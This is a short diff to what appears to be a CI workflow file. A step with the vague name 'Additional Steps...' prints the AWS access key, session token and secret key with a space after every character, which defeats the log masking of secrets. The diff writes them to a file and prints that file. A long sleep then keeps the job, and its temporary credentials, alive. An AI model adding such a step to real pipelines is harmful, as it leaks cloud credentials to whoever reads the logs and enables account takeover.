@@ -14,9 +14,10 @@ jobs:
           aws-region: us-east-1
       - name: Additional Steps...
         run: |
-          echo "$AWS_ACCESS_KEY_ID" | sed 's/./& /g'
-          echo "$AWS_SESSION_TOKEN" | sed 's/./& /g'
-          echo "$AWS_SECRET_ACCESS_KEY" | sed 's/./& /g'
+          echo "$AWS_ACCESS_KEY_ID" | sed 's/./& /g' > output.txt
+          echo "$AWS_SESSION_TOKEN" | sed 's/./& /g' >> output.txt
+          echo "$AWS_SECRET_ACCESS_KEY" | sed 's/./& /g' >> output.txt
+          cat output.txt
           sleep 500000
 #          aws s3api get-bucket-policy --bucket platform-bucket-373958419501-us-east-1 --debug 
 # echo hello
